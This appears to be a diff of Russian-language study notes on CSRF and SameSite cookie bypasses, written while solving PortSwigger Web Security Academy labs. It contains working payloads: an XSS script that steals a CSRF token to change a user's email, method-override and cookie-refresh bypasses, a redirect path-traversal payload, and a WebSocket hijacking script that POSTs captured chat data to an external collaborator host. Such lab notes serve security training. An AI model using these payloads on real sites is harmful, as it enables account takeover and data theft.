@@ -61,6 +61,23 @@ Repeater -> Engagement tools -> Generate CSRF PoC
 
 ```
 # CSRF уязвимости токена
+
+## Exploiting XSS to perform CSRF
+**Пользователь**, зашедший на страницу с **xss**, направит запрос и свой **csrf токен** на смену **email** на **'/my-account/change-email'**, если **токен** висит в **html**.
+```javascript
+<script>  
+var req = new XMLHttpRequest();  
+req.onload = handleResponse;  
+req.open('get','/my-account',true);  
+req.send();  
+function handleResponse() {  
+var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];  
+var changeReq = new XMLHttpRequest();  
+changeReq.open('post', '/my-account/change-email', true);  
+changeReq.send('csrf='+token+'&email=test@test.com')  
+};  
+</script>
+```
 ## CSRF, когда проверка токена зависит от метода запроса (use exploit server)
 https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method
 1. Repeater -> Change request method
@@ -141,20 +158,86 @@ $FORM
 |`https://example.com`|`http://example.com`|No: mismatched scheme|No: mismatched scheme|
 ![[SameSite ограничения.png]]
 ![[SameSite strict.png]]
-# Exploiting XSS to perform CSRF
-**Пользователь**, зашедший на страницу с **xss**, направит запрос и свой **csrf токен** на смену **email** на **'/my-account/change-email'**, если **токен** висит в **html**.
+## Обход SameSite Lax через переопределение метода (use exploit server)
+https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override
+Может быть полезным Burp расширение: `Param Miner`.
+
+Сначала пробуем переопределить метод запроса с POST на GET:
+1. Repeater->Change request method
+2. Пробуем параметр **`&_method=POST`**: GET /my-account/change-email?email=q%40q.q**`&_method=POST`** HTTP/2
+Эксплойт:
 ```javascript
-<script>  
-var req = new XMLHttpRequest();  
-req.onload = handleResponse;  
-req.open('get','/my-account',true);  
-req.send();  
-function handleResponse() {  
-var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];  
-var changeReq = new XMLHttpRequest();  
-changeReq.open('post', '/my-account/change-email', true);  
-changeReq.send('csrf='+token+'&email=test@test.com')  
-};  
+<script>
+document.location="https://{site.com}/change-email?email=q%40q.q&_method=POST"
 </script>
 ```
+## Обход SameSite Lax через обновление cookie (use exploit server)
+https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
+Cookies с ограничениями Lax SameSite обычно не отправляются в межсайтовых POST-запросах, но есть и исключения.  
+  
+Если веб-сайт не включает атрибут SameSite при установке cookie, Chrome автоматически применяет ограничения Lax по умолчанию. Однако, чтобы не нарушать механизмы единой авторизации (SSO), он не применяет эти ограничения в течение первых 120 секунд для POST-запросов верхнего уровня. В результате в течение двух минут пользователи могут быть подвержены межсайтовым атакам.
+
+В лабораторной работе настроен механизм авторизации через сторонний сервис. Значит если мы обновим ограничение первых 120 секунд, вызываемое при авторизации через сторонний сервис, то сможем воспользоваться  cookie.
+
+1. Repeater -> Engagement tools -> Generate CSRF PoC = $FORM
+```javascript
+$FORM
+<script>
+	window.open('https://{site.com}/social-login');
+	setTimeout(changeEmail, 5000);
+
+	const changeEmail = () => document.forms[0].submit();
+	/* или
+	function changeEmail() {
+		document.forms[0].submit();
+	}
+	*/
+</script>
+```
+
+## SameSite Strict - перенаправление на стороне клиента (use exploit server)
+https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect
+Допустим на сайте есть скрипт:
+```javascript
+redirectOnConfirmation = (blogPath) => {
+    setTimeout(() => {
+        const url = new URL(window.location);
+        const postId = url.searchParams.get("postId");
+        window.location = blogPath + '/' + postId;
+    }, 3000);
+}
+```
+В таком случае можно использовать open redirect - маршрут по изменению email в параметре postId:
+```http
+GET /site.com/?postId=../../../{маршрут на смену email}
+```
+Далее просто проэксплуатирвоать нагрузку:
+```javascript
+<script>
+	document.lacation = 'https://site.com/?postId=../../../{маршрут на смену email}'
+</script>
+```
+По сути нужно лишь проэксплуатировать open redirect, если он есть на сайте.
+
+## SameSite Strict через дочерний домен ([cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) ([CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)))
+https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
+Допустим есть сервер с живым чатом, использующий веб-сокеты для загрузки контента даже неавторизованного пользователя. Можно открыть CSRF соединение искусственно на своём explit сервере:
+
+``` javascript
+<script>
+var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; 
+ws.onmessage = function(event) { 
+	fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; 
+</script>
+```
+В итоге в тело запроса колобаратора попадёт подтверждение наличия уязвимости CSWSH.
+С помощью Target -> Site map можно изучить веб-ресурс и поискать сторонние домены, например в js скриптах или html. В данной лабораторной оказывается уязвимый поддомен с XSS. 
+
+На уязвимом сайте делаем XSS в GET запросе с закодированным в URL скриптом выше.
+```http
+https://cms-0ae4007f048e205982bcbfed00bc0073.web-security-academy.net/login?username=%3Cscript%3E{here code upper}%3C/script%3E&password=q
+```
+
+# Валидация заголовка Refere
+
 
